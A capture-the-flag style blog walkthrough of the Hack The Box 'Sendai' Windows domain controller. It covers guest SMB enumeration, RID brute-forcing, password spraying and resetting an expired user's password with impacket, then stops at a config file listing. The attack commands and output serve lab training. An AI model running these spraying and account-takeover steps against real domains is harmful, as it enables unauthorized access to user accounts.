---
title: Sendai
date: 2026-04-07
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - Port53-DNS-Discovery-Host
  - Port139-135-SMB-anonymous-login
  - Port139-135-SMB-rid-brute
  - Bloodhound-Setup-Docker-x86
  - Bloodhound-Collect-nxc
  - Bloodhound-vectory-GenericAll
  - 
  - Bloodhound-vectory-ReadGMSAPassword
  - Port5985-winrm-evil-winrm-py
  - Windows-Privilege-Enumation-Service
  - Port-unknown-ADCS-ESC4-change-ESC1
lastmod: 2026-05-06T09:11:43.348Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Sendai" >}}

***

# Recon

### PORT & IP SCAN

```
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2026-04-13 11:38:34 EDT for 22s
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
51962/tcp open  unknown          syn-ack ttl 127
54110/tcp open  unknown          syn-ack ttl 127
54111/tcp open  unknown          syn-ack ttl 127
54128/tcp open  unknown          syn-ack ttl 127
54132/tcp open  unknown          syn-ack ttl 127
60843/tcp open  unknown          syn-ack ttl 127
```

### DNS 53

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-Discovery-Host" >}} The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `sendai.vl`, and the hostname is `DC`.I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.214.142  --generate-hosts-file hosts
SMB         10.129.214.142  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# cat hosts       
10.129.214.142     DC.sendai.vl sendai.vl DC
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# sudo vim /etc/hosts
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.129.214.142     DC.sendai.vl sendai.vl DC

::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


```

### Port 80

Standard windows IIS web server , dont have too much information in here

![Pasted image 20260414162450.png](/ob/Pasted%20image%2020260414162450.png)

### SMB

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-anonymous-login" >}} It also shows Null auth, but on a DC this will always be true. In this case, guest auth allows for me to list shares as any user:

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb 10.129.214.142  -u 'guest' -p '' --shares
SMB         10.129.214.142  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.129.214.142  445    DC               [+] sendai.vl\guest: 
SMB         10.129.214.142  445    DC               [*] Enumerated shares
SMB         10.129.214.142  445    DC               Share           Permissions     Remark
SMB         10.129.214.142  445    DC               -----           -----------     ------
SMB         10.129.214.142  445    DC               ADMIN$                          Remote Admin
SMB         10.129.214.142  445    DC               C$                              Default share
SMB         10.129.214.142  445    DC               config                          
SMB         10.129.214.142  445    DC               IPC$            READ            Remote IPC
SMB         10.129.214.142  445    DC               NETLOGON                        Logon server share 
SMB         10.129.214.142  445    DC               sendai          READ            company share
SMB         10.129.214.142  445    DC               SYSVOL                          Logon server share 
SMB         10.129.214.142  445    DC               Users           READ            
```

The `sendia` share has a few directories and an `incident.txt` file:

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient -U Guest%'' //10.129.214.142/Users 
Try "help" to get a list of possible commands.
smb: \> 
```

But there is not any interesting in `Users`

```
smb: \> ls
  .                                  DR        0  Tue Jul 11 05:58:27 2023
  ..                                DHS        0  Tue Apr 15 22:55:42 2025
  Default                           DHR        0  Tue Jul 11 12:36:32 2023
  desktop.ini                       AHS      174  Sat May  8 04:18:31 2021
  Public                             DR        0  Tue Jul 11 03:36:58 2023

                7019007 blocks of size 4096. 1207039 blocks available
smb: \> 
```

Getting the these file in `sendai`

`incident.txt`\
{{< code >}}\
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.\
{{< /code >}}

That maybe the hits to use the weak password\
There are accounts with weak passwords that have been expired and will need to change their passwords on next login.\
`guidelines.txt`\
{{< code >}}\
Company: Sendai\
User Behavior Guidelines

Effective Date: \[Insert Date]\
Version: 1.0

Table of Contents:

Introduction

General Guidelines

Security Guidelines

Internet and Email Usage Guidelines

Data Management Guidelines

Software Usage Guidelines

Hardware Usage Guidelines

Conclusion

Introduction:

These User Behavior Guidelines are established to ensure the efficient and secure use of information technology resources within Sendai. By adhering to these guidelines, users can contribute to maintaining a productive and secure IT environment. It is the responsibility of every employee to read, understand, and follow these guidelines.

General Guidelines:\
2.1. Password Security:\
a. Users must choose strong passwords that are difficult to guess.\
b. Passwords should be changed regularly and not shared with others.\
c. Users should never write down their passwords or store them in easily accessible locations.

2.2. User Accounts:\
a. Users must not share their user accounts with others.\
b. Each user is responsible for any activities carried out using their account.

2.3. Reporting Incidents:\
a. Users must promptly report any suspected security incidents or unauthorized access to the IT department.\
b. Users should report any IT-related issues to the IT support team for resolution.

2.4. Physical Security:\
a. Users should not leave their workstations unlocked and unattended.\
b. Confidential information and sensitive documents should be stored securely.

Security Guidelines:\
3.1. Malicious Software:\
a. Users must not download or install unauthorized software on company devices.\
b. Users should regularly update their devices with the latest security patches and antivirus software.

3.2. Social Engineering:\
a. Users should be cautious of phishing emails, phone calls, or messages.\
b. Users must not share sensitive information or credentials through untrusted channels.

3.3. Data Backup:\
a. Users should regularly back up their important files and data.\
b. Critical data should be stored on secure network drives or cloud storage.

Internet and Email Usage Guidelines:\
4.1. Acceptable Use:\
a. Internet and email usage should be for work-related purposes.\
b. Users must not access or download inappropriate or unauthorized content.

4.2. Email Etiquette:\
a. Users should maintain professionalism in all email communications.\
b. Users should avoid forwarding chain emails or unauthorized attachments.

4.3. Email Security:\
a. Users should exercise caution when opening email attachments or clicking on links from unknown sources.\
b. Confidential information must not be sent via unencrypted email.

Data Management Guidelines:\
5.1. Data Classification:\
a. Users must classify data according to its sensitivity level.\
b. Users should handle and store sensitive data in accordance with the company's data protection policies.

5.2. Data Privacy:\
a. Users must respect the privacy of personal and sensitive information.\
b. Unauthorized disclosure or sharing of personal data is strictly prohibited.

Software Usage Guidelines:\
6.1. Authorized Software:\
a. Users must only use authorized software and adhere to licensing agreements.\
b. Users should not install or use unauthorized or pirated software.

6.2. Software Updates:\
a. Users should regularly update their software to benefit from the latest features and security patches.\
b. Automatic updates should be enabled whenever possible.

Hardware Usage Guidelines:\
7.1. Equipment Care:\
a. Users should handle company hardware with care and report any damages or malfunctions promptly.\
b. Users must not attempt to repair or modify company equipment without proper authorization.

7.2. Personal Devices:\
a. Users should not connect personal devices to the company network without prior approval from the IT department.\
b. Personal devices used for work purposes must comply with company security policies.

Conclusion:\
By following these User Behavior Guidelines, Sendai employees contribute to the overall security, productivity, and effectiveness of the company's IT infrastructure. Users should regularly review these guidelines and seek clarification from the IT department whenever necessary.

Failure to comply with these guidelines may result in disciplinary action, including the suspension of IT privileges or other appropriate measures.

For any questions or concerns regarding these guidelines, please contact the IT department at \[Contact Information].\
{{< /code >}}

Possible userslist in the `\transfer\`

```
  .                                   D        0  Tue Jul 11 09:00:20 2023
  ..                                  D        0  Tue Jul 18 13:31:04 2023
  anthony.smith                       D        0  Tue Jul 11 08:59:50 2023
  clifford.davey                      D        0  Tue Jul 11 09:00:06 2023
  elliot.yates                        D        0  Tue Jul 11 08:59:26 2023
  lisa.williams                       D        0  Tue Jul 11 08:59:34 2023
  susan.harper                        D        0  Tue Jul 11 08:59:39 2023
  temp                                D        0  Tue Jul 11 09:00:16 2023
  thomas.powell                       D        0  Tue Jul 11 08:59:45 2023

                7019007 blocks of size 4096. 1206612 blocks available
```

{{< code >}}\
anthony.smith\
clifford.davey\
elliot.yates\
lisa.williams\
susan.harper\
temp\
thomas.powell\
{{< /code >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.214.142 -u  userlist -p userlist --continue-on-success  
SMB         10.129.214.142  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [+] sendai.vl\temp:anthony.smith (Guest)
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:clifford.davey STATUS_LOGON_FAILURE
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:thomas.powell STATUS_LOGON_FAILURE 
                                                                                                                    
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-rid-brute" >}} I’ll also brute for RIDs to get a list of usernames and found valid account with same account and same password, noted the STATUS\_PASSWORD\_MUST\_CHANGE that we can update the password with impacket-changepasswd

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.234.66   -u  Guest  -p  ''  --rid-brute
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
SMB         10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)
SMB         10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)
SMB         10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)
SMB         10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)
SMB         10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
SMB         10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)
SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
SMB         10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)
SMB         10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)
SMB         10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)
```

Editing it to tmp and make a good wordlists

```
┌──(root㉿kali)-[~/Desktop]
└─# cat tmp.txt| awk  -F \  '{print $6}' |  awk  -F SENDAI  '{print $2}'                  
\Enterprise
\Administrator
\Guest
\krbtgt
\Domain
\Domain
\Domain
\Domain
\Domain
\Cert
\Schema
\Enterprise
\Group
\Read-only
\Cloneable
\Protected
\Key
\Enterprise
\RAS
\Allowed
\Denied
\DC$
\DnsAdmins
\DnsUpdateProxy
\SQLServer2005SQLBrowserUser$DC
\sqlsvc
\websvc
\staff
\Dorothy.Jones
\Kerry.Robinson
\Naomi.Gardner
\Anthony.Smith
\Susan.Harper
\Stephen.Simpson
\Marie.Gallagher
\Kathleen.Kelly
\Norman.Baxter
\Jason.Brady
\Elliot.Yates
\Malcolm.Smith
\Lisa.Williams
\Ross.Sullivan
\Clifford.Davey
\Declan.Jenkins
\Lawrence.Grant
\Leslie.Johnson
\Megan.Edwards
\Thomas.Powell
\ca-operators
\admsvc
\mgtsvc$
\support
```

Finally will use the vscode to replace to `\`

And here is the finally list

{{< code >}}\
anthony.smith\
clifford.davey\
elliot.yates\
lisa.williams\
susan.harper\
temp\
thomas.powell\
Enterprise\
Administrator\
Guest\
krbtgt\
Domain\
Domain\
Domain\
Domain\
Domain\
Cert\
Schema\
Enterprise\
Group\
Read-only\
Cloneable\
Protected\
Key\
Enterprise\
RAS\
Allowed\
Denied\
DC$
DnsAdmins
DnsUpdateProxy
SQLServer2005SQLBrowserUser$DC\
sqlsvc\
websvc\
staff\
Dorothy.Jones\
Kerry.Robinson\
Naomi.Gardner\
Anthony.Smith\
Susan.Harper\
Stephen.Simpson\
Marie.Gallagher\
Kathleen.Kelly\
Norman.Baxter\
Jason.Brady\
Elliot.Yates\
Malcolm.Smith\
Lisa.Williams\
Ross.Sullivan\
Clifford.Davey\
Declan.Jenkins\
Lawrence.Grant\
Leslie.Johnson\
Megan.Edwards\
Thomas.Powell\
ca-operators\
admsvc\
mgtsvc\$\
support\
{{< /code >}}

I have the option for empty password and same account and same password

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.234.66  -u  tmp1.txt -p  ''  --continue-on-success  
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.66   445    DC               [-] sendai.vl\anthony.smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\clifford.davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\lisa.williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\susan.harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\temp: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Enterprise: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Cert: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Schema: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Enterprise: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Group: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Read-only: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Cloneable: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Protected: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Key: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Enterprise: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\RAS: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Allowed: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Denied: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\DnsAdmins: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\DnsUpdateProxy: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\SQLServer2005SQLBrowserUser$DC: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\staff: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\ca-operators: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\admsvc: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\support: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\: 
```

If i use the empty password will have the `STATUS_PASSWORD_MUST_CHANGE` with elliot.yates and thomas.powell

### Update password

using the impacket-changepasswd to change the password of thomas.powell

```
┌──(root㉿kali)-[~/Desktop]
└─# impacket-changepasswd sendai.vl/thomas.powell:@dc.sendai.vl -newpass 'Password1'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of sendai.vl\thomas.powell
[*] Connecting to DCE/RPC as sendai.vl\thomas.powell
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

back to thomas.powell 's smb shares

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb 10.129.234.66 -u thomas.powell   -p Password1 --shares              
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.66   445    DC               [+] sendai.vl\thomas.powell:Password1 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config          READ,WRITE      
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.66   445    DC               Users           READ            
```

using the smbclient to find out there is the `sqlconfig` file

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient '//DC.sendai.vl/config' -U 'thomas.powell%Password1'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 14 23:53:14 2026                                                                                                              
  ..                                DHS        0  Tue Apr 15 22:55:42 2025                                                                                                              
  .sqlconfig                          A       78  Tue Jul 11 08:57:11 2023                                                                                                              
                                                                                                                                                                                        
